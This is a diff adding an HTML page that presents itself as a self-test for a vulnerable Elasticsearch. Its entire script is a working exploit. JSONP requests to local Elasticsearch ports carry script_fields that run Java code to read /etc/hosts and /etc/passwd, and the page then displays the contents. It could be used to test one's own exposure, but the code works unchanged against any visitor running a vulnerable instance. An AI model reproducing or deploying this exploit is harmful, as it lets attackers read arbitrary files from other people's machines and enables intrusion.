@@ -1,0 +1,77 @@
+<h3>Your /etc/hosts and /etc/passwd contents should appear on this page if you're vulnerable</h3>
+<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+<script>
+var read_file;
+
+read_file = function(filename) {
+  return ("import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"" + filename + "\")).useDelimiter(\"\\\\Z\").next();");
+};
+
+$(function() {
+  var exploit, filename, files, host, _i, _len;
+  files = ["/etc/hosts", "/etc/passwd"];
+  exploit = {
+    "size": 1,
+    "query": {
+      "filtered": {
+        "query": {
+          "match_all": {}
+        }
+      }
+    },
+    "script_fields": {}
+  };
+  for (_i = 0, _len = files.length; _i < _len; _i++) {
+    filename = files[_i];
+    exploit["script_fields"][filename] = {
+      "script": read_file(filename)
+    };
+  }
+  $.getJSON("http://localhost:9200/_search?source=" + (encodeURIComponent(JSON.stringify(exploit))) + "&callback=?", function(data) {
+    var content, contents, hit, _j, _len1, _ref, _results;
+    console.log(data);
+    _ref = data["hits"]["hits"];
+    _results = [];
+    for (_j = 0, _len1 = _ref.length; _j < _len1; _j++) {
+      hit = _ref[_j];
+      _results.push((function() {
+        var _k, _len2, _ref1;
+        _ref1 = hit["fields"];
+        for (filename in _ref1) {
+          contents = _ref1[filename];
+          document.body.innerHTML += ("<h2>" + filename + "</h2>");
+          for (_k = 0, _len2 = contents.length; _k < _len2; _k++) {
+            content = contents[_k];
+            document.body.innerHTML += ("<pre>" + content + "</pre>");
+          }
+          document.body.innerHTML += ("<hr>");
+        }
+      })());
+    }
+    return _results;
+  });
+  $.getJSON("http://localhost:19200/_search?source=" + (encodeURIComponent(JSON.stringify(exploit))) + "&callback=?", function(data){
+    var content, contents, hit, _j, _len1, _ref, _results;
+    console.log(data);
+    _ref = data["hits"]["hits"];
+    _results = [];
+    for (_j = 0, _len1 = _ref.length; _j < _len1; _j++) {
+      hit = _ref[_j];
+      _results.push((function() {
+        var _k, _len2, _ref1;
+        _ref1 = hit["fields"];
+        for (filename in _ref1) {
+          contents = _ref1[filename];
+          document.body.innerHTML += ("<h2>" + filename + "</h2>");
+          for (_k = 0, _len2 = contents.length; _k < _len2; _k++) {
+            content = contents[_k];
+            document.body.innerHTML += ("<pre>" + content + "</pre>");
+          }
+          document.body.innerHTML += ("<hr>");
+        }
+      })());
+    }
+    return _results;
+  });
+});
+</script>
